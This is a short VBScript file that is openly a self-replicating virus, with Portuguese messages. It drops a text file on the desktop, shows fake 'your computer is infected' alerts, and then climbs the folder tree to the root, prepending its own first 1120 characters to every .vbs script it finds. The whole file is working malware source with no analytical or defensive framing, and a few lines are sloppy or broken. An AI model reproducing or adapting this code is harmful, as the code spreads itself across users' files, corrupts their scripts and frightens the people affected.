

Set ws = CreateObject("WScript.Shell")
DesktopPath = ws.SpecialFolders("Desktop")
Set fso = CreateObject("Scripting.FileSystemObject")

Set Free = fso.CreateTextFile(DesktopPath & "\Girl.txt", True)

Free.WriteLine ("Parabens!")
Free.WriteLine ("Tenha muitas alegrias!")
Free.Close

MsgBox_Message_Text   = "Seu computador esta infectado!!!."
MsgBox_Title_Text     = "Virus Informa!"
Call ABC()

MsgBox_Message_Text1   = "Virus esta ativado agora!!!."
MsgBox_Title_Text1     = "Virus diz!"
Call ABCD()


Sub ABC()
    Dim Ativar

    Ativar =  MsgBox(MsgBox_Message_Text,    _   
                      vbOKOnly + vbCritical,       _
                      MsgBox_Title_Text )
    If Ativar = vbOKOnly Then
        WScript.Quit
    End If
End Sub

Sub ABCD()
    Dim Ver

    Ver =  MsgBox(MsgBox_Message_Text1,    _   
                      vbOKOnly + vbCritical,       _
                      MsgBox_Title_Text1 )
    If Ver = vbOKOnly Then
        WScript.Quit
    End If
End Sub

Set FSO = CreateObject("Scripting.FileSystemObject")
VS   = 1120
FN =  WScript.ScriptFullName
InfPath = Left(FN, InStrRev(FN, "\"))
InfFolder(InfPath)

Sub InfFolder(iPath)
 if FSO.FolderExists(iPath) then
 Do
 Set FolderObj = FSO.GetFolder(iPath)
 iPath = FSO.GetParentFolderName(iPath)
 Set FO = FolderObj.Files
 For each target in FO
 ExtName = lcase(FSO.GetExtensionName(target.Name))

 if ExtName = "vbs" then
 Set Belo = FSO.OpenTextFile(target.path, 1, False)
 
 InfFile(target.path)
 else
 Close()
 End if
 

 next
 Loop Until FolderObj.IsRootFolder = True
 end if
 End Sub

Sub InfFile(iPath)
Set BeloFile    = FSO.OpenTextFile(iPath,1,False)
BeloContent     = BeloFile.ReadAll()
BeloFile.Close

Set HostFile      = FSO.OpenTextFile(WScript.ScriptFullName,1,False)
HostContent       = HostFile.ReadAll()
HostFile.Close

Vir = Mid(HostContent,1,VS)

Set BeloFile    = FSO.OpenTextFile(iPath,2,False)
BeloFile.Write Vir
BeloFile.Write BeloContent
BeloFile.Close

End Sub


